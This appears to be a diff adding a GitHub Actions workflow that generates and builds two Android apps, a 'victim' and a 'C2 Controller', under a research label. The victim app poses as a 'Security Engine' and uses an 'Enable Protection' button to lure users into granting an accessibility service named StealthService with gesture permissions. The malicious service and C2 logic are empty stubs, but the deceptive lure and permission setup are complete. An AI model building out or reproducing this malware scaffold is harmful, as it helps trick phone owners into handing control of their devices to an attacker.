@@ -1,0 +1,157 @@
+name: Mobile Research Build Fixed
+on: [push, workflow_dispatch]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          java-version: '17'
+          distribution: 'temurin'
+
+      - name: Create Structure and Code
+        run: |
+          # 1. יצירת תיקיות
+          mkdir -p victim/src/main/java/com/research/lab/victim
+          mkdir -p victim/src/main/res/xml
+          mkdir -p controller/src/main/java/com/research/lab/controller
+
+          # 2. קבצי הגדרות פרויקט (Gradle)
+          echo "include ':victim', ':controller'" > settings.gradle
+          
+          cat <<'EOF' > build.gradle
+          buildscript {
+              repositories { google(); mavenCentral() }
+              dependencies { classpath 'com.android.tools.build:gradle:8.1.0' }
+          }
+          allprojects {
+              repositories { google(); mavenCentral() }
+          }
+          EOF
+
+          # 3. הגדרות מודול ה-Victim
+          cat <<'EOF' > victim/build.gradle
+          plugins { id 'com.android.application' }
+          android {
+              namespace 'com.research.lab.victim'
+              compileSdk 33
+              defaultConfig { applicationId "com.research.lab.victim"; minSdk 24; targetSdk 33 }
+          }
+          EOF
+
+          # 4. הגדרות מודול ה-Controller
+          cat <<'EOF' > controller/build.gradle
+          plugins { id 'com.android.application' }
+          android {
+              namespace 'com.research.lab.controller'
+              compileSdk 33
+              defaultConfig { applicationId "com.research.lab.controller"; minSdk 24; targetSdk 33 }
+          }
+          EOF
+
+          # 5. הזרקת קוד ה-Java (שימוש ב-'EOF' מונע שגיאות תווים)
+          cat <<'EOF' > victim/src/main/java/com/research/lab/victim/VictimApp.java
+          package com.research.lab.victim;
+          import android.accessibilityservice.AccessibilityService;
+          import android.app.Activity;
+          import android.content.Intent;
+          import android.os.Bundle;
+          import android.widget.Button;
+          import android.widget.LinearLayout;
+          import android.widget.TextView;
+
+          public class VictimApp {
+              public static class LoadingActivity extends Activity {
+                  @Override
+                  protected void onCreate(Bundle savedInstanceState) {
+                      super.onCreate(savedInstanceState);
+                      LinearLayout layout = new LinearLayout(this);
+                      TextView tv = new TextView(this);
+                      tv.setText("Security System Initializing...");
+                      layout.addView(tv);
+                      Button btn = new Button(this);
+                      btn.setText("Enable Protection");
+                      btn.setOnClickListener(v -> startActivity(new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS)));
+                      layout.addView(btn);
+                      setContentView(layout);
+                  }
+              }
+              public static class StealthService extends AccessibilityService {
+                  @Override public void onAccessibilityEvent(android.view.accessibility.AccessibilityEvent event) {}
+                  @Override public void onInterrupt() {}
+              }
+          }
+          EOF
+
+          cat <<'EOF' > controller/src/main/java/com/research/lab/controller/ControllerApp.java
+          package com.research.lab.controller;
+          import android.app.Activity;
+          import android.os.Bundle;
+          import android.widget.TextView;
+
+          public class ControllerApp extends Activity {
+              @Override
+              protected void onCreate(Bundle savedInstanceState) {
+                  super.onCreate(savedInstanceState);
+                  TextView tv = new TextView(this);
+                  tv.setText("C2 Controller Running");
+                  setContentView(tv);
+              }
+          }
+          EOF
+
+          # 6. יצירת המניפסטים (עם הגנה על סימני $)
+          cat <<'EOF' > victim/src/main/AndroidManifest.xml
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+              <uses-permission android:name="android.permission.INTERNET" />
+              <application android:label="Security Engine">
+                  <activity android:name=".VictimApp$LoadingActivity" android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.intent.action.MAIN" />
+                          <category android:name="android.intent.category.LAUNCHER" />
+                      </intent-filter>
+                  </activity>
+                  <service android:name=".VictimApp$StealthService" 
+                           android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" 
+                           android:exported="true">
+                      <intent-filter><action android:name="android.accessibilityservice.AccessibilityService" /></intent-filter>
+                      <meta-data android:name="android.accessibilityservice" android:resource="@xml/acc_config" />
+                  </service>
+              </application>
+          </manifest>
+          EOF
+
+          echo '<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android" android:accessibilityFlags="flagDefault" android:canPerformGestures="true" />' > victim/src/main/res/xml/acc_config.xml
+
+          cat <<'EOF' > controller/src/main/AndroidManifest.xml
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+              <uses-permission android:name="android.permission.INTERNET" />
+              <application android:label="C2 Controller">
+                  <activity android:name=".ControllerApp" android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.intent.action.MAIN" />
+                          <category android:name="android.intent.category.LAUNCHER" />
+                      </intent-filter>
+                  </activity>
+              </application>
+          </manifest>
+          EOF
+
+      - name: Build with Gradle
+        run: |
+          # קיבוע גרסת Gradle ל-8.0 כדי למנוע את השגיאה שקיבלת
+          gradle wrapper --gradle-version 8.0
+          chmod +x gradlew
+          ./gradlew assembleDebug --no-daemon
+
+      - name: Upload APKs
+        uses: actions/upload-artifact@v4
+        with:
+          name: final-research-apks
+          path: "**/build/outputs/apk/debug/*.apk"
+          
